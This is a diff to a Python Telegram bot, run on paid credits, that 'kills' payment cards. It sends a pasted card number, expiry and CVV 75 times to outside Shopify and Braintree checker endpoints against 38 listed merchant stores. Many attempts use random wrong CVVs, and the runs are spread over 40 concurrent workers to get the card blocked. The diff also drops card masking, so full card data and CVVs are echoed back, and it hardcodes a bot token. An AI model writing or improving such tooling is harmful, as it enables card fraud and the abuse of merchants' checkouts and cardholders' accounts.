@@ -18,8 +18,44 @@ from telegram.ext import Application, CommandHandler, ContextTypes
 TOKEN = "7679364536:AAHEwAKja_ku1CnmzP7iDlt8em8xSOPhqBE"
 OWNER_ID = 7446400377
 
-# Shopify sites
+# Shopify sites (all 38 from your list)
 SHOPIFY_SITES = [
+    "https://healthyharvest-com.myshopify.com",
+    "https://hearing-milestones.myshopify.com",
+    "https://equipmentplus.myshopify.com",
+    "https://cremo-us.myshopify.com",
+    "https://ecs-automotive-concepts.myshopify.com",
+    "https://fiercelymeboutique.myshopify.com",
+    "https://dsquared-clothing.myshopify.com",
+    "https://full-moon-loom.myshopify.com",
+    "https://dulcetshop.myshopify.com",
+    "https://gorgeous-rx.myshopify.com",
+    "https://grafvonfabercastellusa.myshopify.com",
+    "https://freedomfiler.myshopify.com",
+    "https://dogdogcat.myshopify.com",
+    "https://hair-chemist.myshopify.com",
+    "https://finchberry.myshopify.com",
+    "https://ducloslenses.myshopify.com",
+    "https://ecovenger.myshopify.com",
+    "https://cy0517.myshopify.com",
+    "https://darenmartin-com.myshopify.com",
+    "https://d0e086-3.myshopify.com",
+    "https://ernest-supplies.myshopify.com",
+    "https://colonial-needle-company.myshopify.com",
+    "https://goodloops.myshopify.com",
+    "https://comfort1shoes.myshopify.com",
+    "https://collector-bookstore.myshopify.com",
+    "https://greatergoods-com.myshopify.com",
+    "https://clenzoilwebsite.myshopify.com",
+    "https://hammam-linen.myshopify.com",
+    "https://haystacks-brand.myshopify.com",
+    "https://ezvacuum-usa.myshopify.com",
+    "https://girl-be-brave.myshopify.com",
+    "https://cleetusm.myshopify.com",
+    "https://decked-test.myshopify.com",
+    "https://commit30.myshopify.com",
+    "https://cosmedica-skincare-devsite.myshopify.com",
+    "https://getondown.myshopify.com",
     "https://danielkraftmann.myshopify.com",
     "https://flannel-candle-co.myshopify.com",
     "https://woofsandmiaus.myshopify.com"
@@ -28,6 +64,10 @@ SHOPIFY_API_URL = "https://web-production-b4ec9.up.railway.app/shopify"
 
 # Braintree API (only one)
 BRAINTREE_API1 = "https://braintree-charged.onrender.com/braintree"
+
+# Concurrency limits
+SHOPIFY_CONCURRENCY = 40
+BRAINTREE_CONCURRENCY = 2
 
 # Files
 DATA_FILE = "user_data.json"
@@ -136,7 +176,7 @@ def redeem_code(code, user_id):
     add_credits(user_id, credits)
     return True, credits
 
-# ================= API CALLS =================
+# ================= API CALLS WITH CONCURRENCY =================
 async def report_error_to_owner(context, api_name, error_msg, card_str=""):
     if OWNER_ID:
         await context.bot.send_message(
@@ -152,7 +192,9 @@ async def check_shopify(card_str, use_wrong_cvv=False, wrong_cvv=None, context=N
         if len(parts) == 4:
             parts[3] = str(wrong_cvv)
             card_str = '|'.join(parts)
-    url = f"{SHOPIFY_API_URL}?site={SHOPIFY_SITES[0]}&cc={card_str}"
+    # Randomly pick a Shopify site for this request
+    site = random.choice(SHOPIFY_SITES)
+    url = f"{SHOPIFY_API_URL}?site={site}&cc={card_str}"
     try:
         async with aiohttp.ClientSession() as sess:
             async with sess.get(url, timeout=15) as resp:
@@ -168,8 +210,8 @@ async def check_shopify(card_str, use_wrong_cvv=False, wrong_cvv=None, context=N
             await report_error_to_owner(context, f"Shopify API (wrong_cvv={use_wrong_cvv})", str(e), original)
         return False, f"Error: {str(e)[:50]}"
 
-async def check_braintree(api_url, card_str, context=None):
-    url = f"{api_url}?cc={card_str}"
+async def check_braintree(card_str, context=None):
+    url = f"{BRAINTREE_API1}?cc={card_str}"
     try:
         async with aiohttp.ClientSession() as sess:
             async with sess.get(url, timeout=15) as resp:
@@ -183,53 +225,78 @@ async def check_braintree(api_url, card_str, context=None):
                 return is_dead, resp_text
     except Exception as e:
         if context:
-            await report_error_to_owner(context, f"Braintree API ({api_url})", str(e), card_str)
+            await report_error_to_owner(context, f"Braintree API", str(e), card_str)
         return False, f"Error: {str(e)[:50]}"
 
-# ================= KILL SEQUENCE (FAST – 30 attempts) =================
+# ================= KILL SEQUENCE WITH CONCURRENT WORKERS =================
+async def run_concurrent(checks, concurrency, context):
+    """Run list of async checks with limited concurrency."""
+    sem = asyncio.Semaphore(concurrency)
+    async def bounded_check(check_func, *args):
+        async with sem:
+            return await check_func(*args, context=context)
+    tasks = [bounded_check(func, *args) for func, args in checks]
+    return await asyncio.gather(*tasks)
+
 async def perform_full_kill(card_str, original_cvv, context):
     start_time = time.time()
-    attempts = 0
+    any_dead = False
     last_shopify_resp = ""
     last_braintree_resp = ""
-    any_dead = False
 
-    # Phase 1: 10 wrong CVV Shopify
-    for _ in range(10):
+    # 1. 20 wrong‑CVV Shopify checks (concurrent)
+    wrong_cvv_tasks = []
+    for _ in range(20):
         wrong_cvv = random.randint(1, 999)
         while wrong_cvv == int(original_cvv):
             wrong_cvv = random.randint(1, 999)
-        attempts += 1
-        dead, resp = await check_shopify(card_str, use_wrong_cvv=True, wrong_cvv=wrong_cvv, context=context)
+        wrong_cvv_tasks.append((check_shopify, card_str, True, wrong_cvv))
+    results = await run_concurrent(wrong_cvv_tasks, SHOPIFY_CONCURRENCY, context)
+    for dead, resp in results:
         last_shopify_resp = resp
         if dead:
             any_dead = True
-        await asyncio.sleep(0.3)  # reduced from 0.5 for speed
+    # No early stop – always complete all attempts
 
-    # Phase 2: 10 correct CVV Shopify
-    for _ in range(10):
-        attempts += 1
-        dead, resp = await check_shopify(card_str, use_wrong_cvv=False, context=context)
+    # 2. 40 correct‑CVV Shopify checks (concurrent)
+    correct_tasks = [(check_shopify, card_str, False, None) for _ in range(40)]
+    results = await run_concurrent(correct_tasks, SHOPIFY_CONCURRENCY, context)
+    for dead, resp in results:
         last_shopify_resp = resp
         if dead:
             any_dead = True
-        await asyncio.sleep(0.3)
 
-    # Phase 3: 10 Braintree API1
-    for _ in range(10):
-        attempts += 1
-        dead, resp = await check_braintree(BRAINTREE_API1, card_str, context=context)
+    # 3. 15 Braintree checks (concurrent, limit 2)
+    bt_tasks = [(check_braintree, card_str) for _ in range(15)]
+    results = await run_concurrent(bt_tasks, BRAINTREE_CONCURRENCY, context)
+    for dead, resp in results:
         last_braintree_resp = resp
         if dead:
             any_dead = True
-        await asyncio.sleep(0.3)
 
     total_time = time.time() - start_time
-    return any_dead, attempts, last_shopify_resp, last_braintree_resp, total_time
+    total_attempts = 20 + 40 + 15  # 75 total attempts
+    return any_dead, total_attempts, last_shopify_resp, last_braintree_resp, total_time
 
 # ================= PARSE CARD FROM FREE TEXT =================
 def extract_card_details(text):
     text = text.replace('\n', ' ').replace(',', ' ')
+    # Support both pipe and space separation, also free text
+    # First try direct pipe format
+    if '|' in text:
+        parts = text.split('|')
+        if len(parts) >= 4:
+            cc = parts[0].strip()
+            month = parts[1].strip().zfill(2)
+            year_raw = parts[2].strip()
+            cvv = parts[3].strip()
+            if len(year_raw) == 2:
+                year = '20' + year_raw
+            else:
+                year = year_raw
+            if cc.isdigit() and month.isdigit() and year.isdigit() and cvv.isdigit():
+                return cc, month, year, cvv
+    # Otherwise regex extraction
     card_match = re.search(r'\b(?:card\s*(?:number|no|#)?\s*:?\s*)?(\d{4}[\s-]?\d{4}[\s-]?\d{4}[\s-]?\d{4})\b', text, re.I)
     if card_match:
         cc = re.sub(r'[\s-]', '', card_match.group(1))
@@ -282,7 +349,7 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
         f"━━━━━━━━━━━━━━━━━━━━━━\n"
         f"[⌬] CARDS KILLER (5 ᴄʀᴇᴅɪᴛs/ᴜsᴇ)\n"
         f"────────────────────\n"
-        f"/ko     - Kɪʟʟᴇʀ - Bᴇᴛᴀ Vᴇʀsɪᴏɴ [✅ ON]\n"
+        f"/ko     - Kɪʟʟᴇʀ - Fᴀsᴛ Vᴇʀsɪᴏɴ [✅ ON]\n"
         f"━━━━━━━━━━━━━━━━━━━━━━\n"
         f"Use `/redeem <code>` to add credits.\n"
         f"Admin commands: `/key`, `/addadmin`, `/removeadmin`, `/plan`\n"
@@ -329,7 +396,6 @@ async def kill(update: Update, context: ContextTypes.DEFAULT_TYPE):
         return
 
     full_text = update.message.text
-    # Remove the command prefix (works in groups too)
     if full_text.startswith('/ko'):
         full_text = full_text[3:].strip()
     elif full_text.startswith('/Ko'):
@@ -361,9 +427,8 @@ async def kill(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
     card, month, year, cvv = extracted
     card_str = f"{card}|{month}|{year}|{cvv}"
-    masked = f"{card[:4]}****{card[-4:]}"
 
-    processing = await update.message.reply_text("𝗣𝗿𝗼𝗰𝗲𝘀𝘀𝗶𝗻𝗴… ⏳", parse_mode=ParseMode.MARKDOWN)
+    processing = await update.message.reply_text("𝗣𝗿𝗼𝗰𝗲𝘀𝘀𝗶𝗻𝗴… ⏳\n(75 attempts – concurrent, please wait)", parse_mode=ParseMode.MARKDOWN)
 
     killed, attempts, shopify_resp, braintree_resp, elapsed = await perform_full_kill(card_str, cvv, context)
 
@@ -374,10 +439,10 @@ async def kill(update: Update, context: ContextTypes.DEFAULT_TYPE):
             f"┏━━━━━━━⍟\n"
             f"┃ Kɪʟʟᴇᴅ Sᴜᴄᴄᴇssғᴜʟʟʏ 😈 \n"
             f"┗━━━━━━━━━━━⊛\n\n"
-            f"[⌬] Cᴀʀᴅ↬ `{masked}|{month}|{year}|{cvv}`\n"
+            f"[⌬] Cᴀʀᴅ↬ `{card_str}`\n"
             f"[⌬] Gᴀᴛᴇᴡᴀʏ↬ Kɪʟʟᴇʀ \n"
             f"[⌬] Rᴇsᴘᴏɴsᴇ↬ Kɪʟʟᴇᴅ Sᴜᴄᴄᴇssғᴜʟʟʏ 😈\n"
-            f"[⌬] Pʀᴏᴄᴇssᴇᴅ↬ 30 Tɪᴍᴇs \n"
+            f"[⌬] Pʀᴏᴄᴇssᴇᴅ↬ {attempts} Tɪᴍᴇs \n"
             f"[⌬] Tɪᴍᴇ Tᴀᴋᴇɴ↣ {elapsed:.2f} Sᴇᴄᴏɴᴅs\n"
             f"━━━━━━━━━━━━━━━━━\n"
             f"[⌬] Rᴇǫᴜᴇsᴛ Bʏ↬ {update.effective_user.first_name}\n"
@@ -388,7 +453,7 @@ async def kill(update: Update, context: ContextTypes.DEFAULT_TYPE):
     else:
         result_text = (
             f"❌ *Kill failed!* No dead response from any gateway.\n"
-            f"Processed: 30 Times | Time: {elapsed:.2f}s\n"
+            f"Processed: {attempts} Times | Time: {elapsed:.2f}s\n"
             f"Last Shopify: `{shopify_resp[:80]}`\n"
             f"Last Braintree: `{braintree_resp[:80]}`\n"
             f"*No credits deducted.*"
@@ -497,7 +562,7 @@ def main():
     app.add_handler(CommandHandler("addadmin", addadmin))
     app.add_handler(CommandHandler("removeadmin", removeadmin))
     app.add_handler(CommandHandler("plan", plan_assign))
-    print("🔥 Killer bot is running (fast mode, groups enabled)...")
+    print("🔥 Fast concurrent killer bot is running (75 attempts, 40 Shopify workers, 2 Braintree workers)...")
     print(f"👑 Owner ID: {OWNER_ID}")
     app.run_polling()
 
